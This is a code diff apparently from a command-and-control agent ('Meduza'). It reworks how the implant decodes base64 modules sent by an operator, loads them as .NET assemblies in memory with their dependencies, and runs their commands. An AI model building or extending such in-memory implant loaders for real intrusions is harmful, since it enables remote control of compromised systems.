@@ -4,7 +4,7 @@ using System.Collections.Concurrent;
 using System.Diagnostics;
 using System.IO.Pipes;
 using Agent.Models.C2Request;
-using Agent.ModuleBase;
+using Meduza.Agent.ModuleBase;
 using System.Text.Json;
 using Agent.Core;
 using System.Reflection;
@@ -103,36 +103,71 @@ while (true)
                     {
                         task.QueueRunningStatus(messageQueue, messageQueueLock);
 
-                        ModuleLoadContext loadContext = new();
-                        using (var stream = new MemoryStream())
+                        try
                         {
-                            var decodedModule = Convert.FromBase64String(task.Module);
-                            // var decodedModule = urlSafeBase64DecodingDecorator.Transform(task.Module);
-                            stream.Write(decodedModule);
-                            loadContext.AssemblyBytes = stream;
-                            stream.Position = 0;
-                            var loadedAssembly = loadContext.LoadFromStream(stream);
+                            // Decode the base64 module bytes
+                            var moduleBytes = JsonSerializer.Deserialize<ModuleBytesModel>(
+                                System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(task.Module))
+                            );
 
-                            // var decryptedModule = xorDecryptionDecorator.Transform(decodedModule);
-                            // var decryptedBytes = System.Text.Encoding.UTF8.GetBytes(decryptedModule);
-                            var module = ModuleLoader.LoadModule(Assembly.Load(decodedModule));
-                            foreach (var moduleCommand in module.Commands)
+                            if (moduleBytes == null)
                             {
-                                try
+                                Console.WriteLine("Failed to deserialize module bytes.");
+                                continue;
+                            }
+
+                            // Create a custom load context with dependencies
+                            var loadContext = new ModuleLoadContext
+                            {
+                                AssemblyBytes = moduleBytes.ModuleBytes,
+                                DependencyBytes = moduleBytes.DependencyBytes
+                            };
+                            Assembly assembly = loadContext.LoadFromMemory();
+                            Console.WriteLine($"Loaded assembly: {assembly.FullName}");
+
+                            // You can now use Reflection to interact with the loaded assembly
+                            var types = assembly.GetTypes();
+                            foreach (var type in types)
+                            {
+                                Console.WriteLine($"Type found: {type.FullName}");
+                            }
+
+                            // Load the main module assembly
+                            using (var stream = new MemoryStream(moduleBytes.ModuleBytes))
+                            {
+                                //var loadedAssembly = loadContext.LoadFromStream(stream);
+
+                                // Load the module and its commands
+                                var module = ModuleLoader.Load(moduleBytes);
+
+                                foreach (var moduleCommand in module.Commands)
                                 {
-                                    task.Command.Output = ExecuteCommand(moduleCommand, task.Command.Parameters, task.IsCancellationTokenSourceSet);
-                                }
-                                catch (Exception)
-                                {
-                                    while (commandOutputQueue.TryDequeue(out var commandOutputResult))
+                                    try
                                     {
-                                        task.Command.Output += commandOutputResult;
+                                        task.Command.Output = ExecuteCommand(
+                                            moduleCommand,
+                                            task.Command.Parameters,
+                                            task.IsCancellationTokenSourceSet
+                                        );
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        Console.WriteLine($"Command execution error: {ex.Message}");
+                                        while (commandOutputQueue.TryDequeue(out var commandOutputResult))
+                                        {
+                                            task.Command.Output += commandOutputResult;
+                                        }
                                     }
                                 }
                             }
-                        }
 
-                        task.Module = string.Empty;
+                            task.Module = string.Empty;
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"Module loading error: {ex.Message}");
+                            task.Command.Output = $"Error loading module: {ex.Message}";
+                        }
                     }
 
                     lock (taskQueueLock)
